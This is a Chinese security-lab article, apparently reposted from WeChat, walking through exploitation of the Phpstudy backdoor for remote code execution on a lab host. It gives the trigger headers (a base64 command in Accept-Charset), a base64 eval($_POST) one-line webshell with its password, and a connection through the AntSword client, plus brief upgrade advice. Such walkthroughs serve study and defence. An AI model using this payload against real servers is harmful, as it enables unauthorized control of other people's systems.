> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ekYYHSZuYnLQaQ5Mb-4JsA)

  

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x00 漏洞****简述**  

  

Phpstudy 是一款 PHP 调试环境的程序集成包，集成了最新的 Apache、PHP、phpMyAdmin、ZendOptimizer 等多款软件一次性安装，无需配置，即装即用。Phpstudy + 框架存在后门，**可进行 RCE。**
==========================================================================================================================

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x01 影响版本**

  

  

Phpstudy+2016 版 + php-5.4

Phpstudy+2018 版 + php-5.2.17

Phpstudy+2018 版 + php-5.4.45

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x02 实  战**

  

  

**工欲善其事必先利其器**  

1. 访问环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAmWIs9ZxYWb5OzibXEk7Yuh1aT7YlRR8RSbhhsFAeJC9JSbhked1picKkCwzdQgCGp12LPQvM7iabfA/640?wx_fmt=png)

2. 通过信息收集，获取重要入口

指纹信息：PHP 环境  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAmWIs9ZxYWb5OzibXEk7Yuhib5ud4Jm0IRvPuziaH3WZMCuKGlicbby2F4SRgTXsEET3Rf95l5iciawr0w/640?wx_fmt=png)

目录信息：phpinfo.php  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAmWIs9ZxYWb5OzibXEk7YuhLvZAZhWxrVzn9RBXgicT0qNalsoKQEuoaOAxqF1KTfvSHb9CgibNdNnw/640?wx_fmt=png)

http://192.168.60.132/phpinfo.php

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAmWIs9ZxYWb5OzibXEk7YuhBvhtavUpy3wkELKDXl1ph3mqHBicBicHa16cZ7icRIj214eXKIdb0I21Q/640?wx_fmt=png)

3. 发现使用 PHP study 框架，尝试 POC 验证

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAmWIs9ZxYWb5OzibXEk7YuhrluuxDwWaibtIdQ1ibZ6QEZQsv48rrfNbU4KpKUh1ibeIsG3OIq7errDw/640?wx_fmt=png)

4. 漏洞存在，**尝试 getshell**  

提取关键信息

Accept-Encoding:gzip,deflate

Accept-Charset:base64 编码执行的命令

一句话木马：

ZXZhbCgkX1BPU1RbeXVuenVpXSk7  

密码：yunzui

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAmWIs9ZxYWb5OzibXEk7YuhJqZcqP5objIVdvlJLVaJwDeKB8OSeKKlWF95MYCKUziahrsSocMXuIA/640?wx_fmt=png)

祭出中国蚁剑

基本信息填写

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAmWIs9ZxYWb5OzibXEk7Yuhx0XO1yvRSFKHuxicDLJohdtAhcAAIL3p0ATy0G0b8k8m4UMicXYKQvkw/640?wx_fmt=png)

**关键信息填写**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAmWIs9ZxYWb5OzibXEk7YuhBSPm1uibAia3ceTKs2XwzrYPqZbxbKNGPa3LXl1R0cDyCS85gQRuOKQg/640?wx_fmt=png)

中国蚁剑连接成功

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAmWIs9ZxYWb5OzibXEk7Yuh9wjFnTiaIyg2SX3JYRt7JDEkS7tOFZicVXvJl2iaEibCicbibI9icwj9WkfFg/640?wx_fmt=png)

这种不落地的 webshell, 在安全监测过程中很难发现！从而也更好的说明了安全本质就是不断对抗.......  

‍

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x03 修复建议**

  

  

升级 PHP study 版本。

https://www.xp.cn/index.php

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif) 

知识分享完了

喜欢别忘了关注我们哦~  

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg)